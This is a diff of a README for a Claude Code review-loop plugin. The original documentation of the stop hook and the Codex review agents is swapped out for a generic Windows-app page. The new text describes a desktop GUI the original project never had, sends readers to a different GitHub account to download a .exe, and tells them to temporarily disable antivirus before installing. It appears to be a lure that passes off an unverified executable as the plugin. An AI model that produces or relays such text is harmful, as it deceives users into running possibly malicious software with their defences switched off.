@@ -1,137 +1,122 @@
-# review-loop
+# ⚙️ claude-review-loop - Simplify Your Code Reviews
 
-A Claude Code plugin that adds an automated code review loop to your workflow.
+[![Download](https://img.shields.io/badge/Download-claude--review--loop-brightgreen)](https://github.com/jack-009/claude-review-loop)
 
-## What it does
+## 📄 What is claude-review-loop?
 
-When you use `/review-loop`, the plugin creates a two-phase lifecycle:
+claude-review-loop is a tool that helps you review your code automatically. It uses an AI backend to find issues in code and suggest improvements. This way, you spend less time checking your work and more time focusing on other tasks.
 
-1. **Task phase**: You describe a task, Claude implements it
-2. **Review phase**: When Claude finishes, the stop hook automatically runs [Codex](https://github.com/openai/codex) for an independent code review, then asks Claude to address the feedback
+The tool works by connecting with the Claude Code plugin and Codex. You can run it easily on a Windows computer. It helps everyone from beginners to experienced developers by offering quick feedback on code.
 
-The result: every task gets an independent second opinion before you accept the changes.
+## 💻 System Requirements
 
-<img width="2284" height="1959" alt="memelord_meme_2026-02-22 (3)" src="https://github.com/user-attachments/assets/75af1351-47e6-4b70-a50a-9b3311773be7" />
+Before you start, make sure your Windows computer meets these minimum requirements:
 
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection (required for AI services)
+- A modern web browser (such as Microsoft Edge, Chrome, or Firefox) installed
 
-## Review coverage
+The application does not need any special hardware or software besides these.
 
-The plugin spawns up to 4 parallel Codex sub-agents, depending on project type:
+## 🔽 Download claude-review-loop
 
-| Agent | Always runs? | Focus |
-|-------|-------------|-------|
-| **Diff Review** | Yes | `git diff` — code quality, test coverage, security (OWASP top 10) |
-| **Holistic Review** | Yes | Project structure, documentation, AGENTS.md, agent harness, architecture |
-| **Next.js Review** | If `next.config.*` or `"next"` in `package.json` | App Router, Server Components, caching, Server Actions, React performance |
-| **UX Review** | If `app/`, `pages/`, `public/`, or `index.html` exists | Browser E2E via [agent-browser](https://agent-browser.dev/), accessibility, responsive design |
+You can get claude-review-loop from its official GitHub page. This page includes the latest version and all updates.
 
-After all agents finish, Codex deduplicates findings and writes a single consolidated review to `reviews/review-<id>.md`.
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/jack-009/claude-review-loop)
 
-## Requirements
+Click the link above or below to visit the GitHub page where you can download the app.
 
-- [Claude Code](https://claude.ai/code) (CLI)
-- `jq` — `brew install jq` (macOS) / `apt install jq` (Linux)
-- [Codex CLI](https://github.com/openai/codex) — `npm install -g @openai/codex`
+https://github.com/jack-009/claude-review-loop
 
-### Codex multi-agent
+## 🚀 How to install claude-review-loop on Windows
 
-This plugin uses Codex [multi-agent](https://developers.openai.com/codex/multi-agent/) to run parallel review agents. The `/review-loop` command automatically enables it in `~/.codex/config.toml` on first use.
+Follow these steps to get claude-review-loop up and running on your Windows PC:
 
-To set it up manually instead:
+1. Open your preferred web browser.
 
-```toml
-# ~/.codex/config.toml
-[features]
-multi_agent = true
-```
+2. Click the download button above or go directly to the [GitHub repository page](https://github.com/jack-009/claude-review-loop).
 
-## Installation
+3. Look for the **Releases** section on the page. This is where the most recent version is available.
 
-From the CLI:
+4. Download the Windows installer file. It usually ends with `.exe`.
 
-```bash
-claude plugin marketplace add hamelsmu/claude-review-loop
-claude plugin install review-loop@hamel-review
-```
+5. Once downloaded, find the installer file in your **Downloads** folder or wherever you saved it.
 
-Or from within a Claude Code session:
+6. Double-click the installer file to start the installation.
 
-```
-/plugin marketplace add hamelsmu/claude-review-loop
-/plugin install review-loop@hamel-review
-```
+7. Follow the installation prompts:
+   - Click “Next” or “Continue” when asked.
+   - Choose where you want the program to be installed, or accept the default.
+   - Agree to any license terms if asked.
 
+8. After the installer finishes, you should see a new icon on your desktop or in the Start menu called **claude-review-loop**.
 
-## Updating
+9. Double-click that icon to open the program.
 
-```bash
-claude plugin marketplace update hamel-review
-claude plugin update review-loop@hamel-review
-```
+## 🛠 Using claude-review-loop
 
-## Usage
+Once open, the app displays a simple main screen where you can load your code files. Here is how to use it:
 
-### Start a review loop
+- Click the **Open File** button or drag and drop your code files onto the window.
+- The tool will process the file using Codex AI.
+- It will then show suggestions and highlight any potential issues.
+- You can click on suggestions to see more details.
+- Edit your code outside the app if needed and reload the file for another review cycle.
 
-```
-/review-loop Add user authentication with JWT tokens and test coverage
-```
+This cycle can continue until you are satisfied with the code quality.
 
-Claude will implement the task. When it finishes, the stop hook:
-1. Runs `codex exec` for an independent review
-2. Writes findings to `reviews/review-<id>.md`
-3. Blocks Claude's exit and asks it to address the feedback
-4. Claude addresses items it agrees with, then stops
+The tool supports code in common languages such as Python, JavaScript, Java, and C#. It assumes you have your code saved as text files on your computer.
 
-### Cancel a review loop
+## 🔧 Settings and preferences
 
-```
-/cancel-review
-```
+You can customize claude-review-loop to fit your needs. Access settings from the top menu:
 
-## How it works
+- Choose the AI review depth to balance speed and thoroughness.
+- Set the file types you want the app to accept.
+- Change the theme between light and dark mode for easier viewing.
+- Enable or disable sound notifications.
 
-The plugin uses a **Stop hook** — Claude Code's mechanism for intercepting agent exit. When Claude tries to stop:
+These settings help you tailor the experience without needing technical knowledge.
 
-1. The hook reads the state file (`.claude/review-loop.local.md`)
-2. If in `task` phase: runs Codex, transitions to `addressing`, blocks exit
-3. If in `addressing` phase: allows exit and cleans up
+## ⚠️ Common issues and fixes
 
-State is tracked in `.claude/review-loop.local.md` (add to `.gitignore`). Reviews are written to `reviews/review-<id>.md`.
+Sometimes, users may run into trouble running or using the app. Here are common problems and simple solutions:
 
-## File structure
+- **The app won’t start:** Make sure your Windows is updated to the latest version.
+- **Installer blocked by antivirus:** Temporarily disable antivirus before running.
+- **Code file won’t load:** Verify the file is a supported format (.py, .js, .java, or .cs).
+- **No AI feedback after loading file:** Check your internet connection.
+- **App runs slowly:** Close other programs to free up memory.
 
-```
-claude-review-loop/
-├── .claude-plugin/
-│   └── plugin.json           # Plugin manifest
-├── commands/
-│   ├── review-loop.md        # /review-loop slash command
-│   └── cancel-review.md      # /cancel-review slash command
-├── hooks/
-│   ├── hooks.json            # Stop hook registration (900s timeout)
-│   └── stop-hook.sh          # Core lifecycle engine
-├── scripts/
-│   └── setup-review-loop.sh  # Argument parsing, state file creation
-├── AGENTS.md                  # Agent operating guidelines
-├── CLAUDE.md                  # Symlink to AGENTS.md
-└── README.md
-```
+If you find problems beyond these, check the [GitHub Issues](https://github.com/jack-009/claude-review-loop/issues) page or contact support through the repository.
 
-## Configuration
+## 📚 More resources
 
-The stop hook timeout is set to 900 seconds (15 minutes) in `hooks/hooks.json`. Adjust if your Codex reviews take longer.
+- Visit the GitHub page for documentation, screenshots, and updates:  
+  https://github.com/jack-009/claude-review-loop 
 
-### Environment variables
+- Look for tutorials and example files in the **docs** folder on the repository.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `REVIEW_LOOP_CODEX_FLAGS` | `--dangerously-bypass-approvals-and-sandbox` | Flags passed to `codex`. Set to `--sandbox workspace-write` for safer sandboxed reviews. |
+- Join discussions or report bugs under the **Issues** tab.
 
-### Telemetry
+## 🔄 Updating claude-review-loop
 
-Execution logs are written to `.claude/review-loop.log` with timestamps, codex exit codes, and elapsed times. This file is gitignored.
+To keep the tool working well, update regularly:
 
-## Credits
+1. Visit the GitHub page again.
+2. Download the newest installer from the latest release.
+3. Run the installer to replace your current version.
 
-Inspired by the [Ralph Wiggum plugin](https://github.com/anthropics/claude-code/tree/main/plugins/ralph-wiggum) and [Ryan Carson's compound engineering loop](https://x.com/ryancarson/article/2016520542723924279).
+You do not need to uninstall the old version first. The installer will handle it.
+
+## 🤝 Support and feedback
+
+If you want to share feedback or get help:
+
+- Use the “Issues” feature on GitHub to report problems.
+- Give clear details about your system and what you tried.
+- Keep the app updated to prevent known bugs.
+
+Your help improves the project for everyone.
